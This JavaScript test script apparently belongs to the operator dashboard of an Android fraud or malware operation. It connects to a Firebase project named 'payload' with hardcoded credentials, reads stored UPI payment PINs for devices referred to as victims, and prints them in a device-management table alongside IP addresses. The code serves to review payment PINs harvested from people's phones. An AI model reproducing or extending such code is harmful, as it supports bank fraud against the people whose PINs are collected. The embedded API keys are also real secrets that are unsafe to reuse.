// Test script to verify UPI pins are loaded upfront for Device Management table
import { initializeApp } from "firebase/app";
import { getDatabase, ref, get } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyDAXJOpQaY6auUc9xBV3EwWeMaqG4FJ9Xk",
  authDomain: "payload-fea30.firebaseapp.com",
  databaseURL: "https://payload-fea30-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "payload-fea30",
  storageBucket: "payload-fea30.firebasestorage.app",
  messagingSenderId: "548911851830",
  appId: "1:548911851830:web:db0eb8754598876037eb97"
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Simulate the getAllUPIPins function from FirebaseService
async function getAllUPIPins() {
  try {
    const snapshot = await get(ref(database, 'UPIPins'));
    const allPinsData = snapshot.val();
    
    if (!allPinsData) return {};
    
    const result = {};
    
    // Process each device's UPI pins
    for (const [deviceId, pinsData] of Object.entries(allPinsData)) {
      if (pinsData) {
        if (Array.isArray(pinsData)) {
          // Old format: array of strings
          result[deviceId] = pinsData.map(pin => ({ 
            pin: pin.toString(), 
            timestamp: new Date().toISOString() 
          }));
        } else {
          // New format: object with pin objects
          result[deviceId] = Object.values(pinsData).map((pinObj) => ({
            pin: pinObj.pin || pinObj.toString(),
            timestamp: pinObj.timestamp || new Date().toISOString()
          }));
        }
      }
    }
    
    return result;
  } catch (error) {
    console.error("Error fetching all UPI pins:", error);
    return {};
  }
}

// Simulate the UPI pin status logic from DeviceTable.tsx
function getUPIPinStatus(victimId, upiPins) {
  const hasValidPin =
    upiPins.length > 0 &&
    upiPins.some((pinObj) => {
      // Handle new structure: { pin: string, timestamp: string }
      if (pinObj && typeof pinObj === 'object' && pinObj.pin) {
        return pinObj.pin && pinObj.pin !== "No Pin";
      }
      // Handle old structure: string[]
      if (typeof pinObj === 'string') {
        return pinObj && pinObj !== "No Pin";
      }
      return false;
    });

  return hasValidPin ? "Has Pin" : "No Pin";
}

// Test the complete flow
async function testDeviceManagementUPI() {
  try {
    console.log('🧪 Testing UPI Pins Loading for Device Management Table...\n');
    
    // Test 1: Load all UPI pins (like the app now does)
    console.log('📥 Step 1: Loading all UPI pins upfront...');
    const allUPIPins = await getAllUPIPins();
    console.log('✅ All UPI pins loaded:', allUPIPins);
    console.log('');
    
    // Test 2: Check each device's status
    console.log('🔍 Step 2: Checking UPI pin status for each device...');
    
    const devices = [
      'Xiaomi 23076PC4BI',
      'Xiaomi M2103K19PI', 
      'motorola moto g85 5G',
      'samsung SM-A037F'
    ];
    
    for (const deviceId of devices) {
      const upiPins = allUPIPins[deviceId] || [];
      const status = getUPIPinStatus(deviceId, upiPins);
      
      console.log(`📱 ${deviceId}:`);
      console.log(`   UPI Pins count: ${upiPins.length}`);
      console.log(`   UPI Pins data:`, upiPins);
      console.log(`   Status: ${status}`);
      console.log(`   Badge: ${status === "Has Pin" ? "🟢 Green" : "🔴 Red"}`);
      console.log('');
    }
    
    // Test 3: Show what the Device Management table should display
    console.log('📋 Step 3: Device Management Table Display Preview:');
    console.log('┌─────────────────────┬─────────────┬─────────────┬─────────────┬─────────────┐');
    console.log('│ Device               │ Status      │ Android     │ UPI Pin     │ IP Address  │');
    console.log('├─────────────────────┼─────────────┼─────────────┼─────────────┼─────────────┤');
    
    devices.forEach(deviceId => {
      const upiPins = allUPIPins[deviceId] || [];
      const status = getUPIPinStatus(deviceId, upiPins);
      const deviceName = deviceId.length > 20 ? deviceId.substring(0, 17) + '...' : deviceId.padEnd(20);
      const statusText = status === "Has Pin" ? "🟢 Has Pin" : "🔴 No Pin";
      
      console.log(`│ ${deviceName} │ Online      │ Android V14 │ ${statusText.padEnd(11)} │ 192.168.x.x │`);
    });
    
    console.log('└─────────────────────┴─────────────┴─────────────┴─────────────┴─────────────┘');
    
    console.log('\n🎉 Device Management UPI Test Completed!');
    
  } catch (error) {
    console.error('❌ Error during testing:', error);
  }
}

// Run the test
testDeviceManagementUPI().then(() => {
  console.log('\n✅ All tests passed!');
  process.exit(0);
}).catch((error) => {
  console.error('\n❌ Test failed:', error);
  process.exit(1);
});
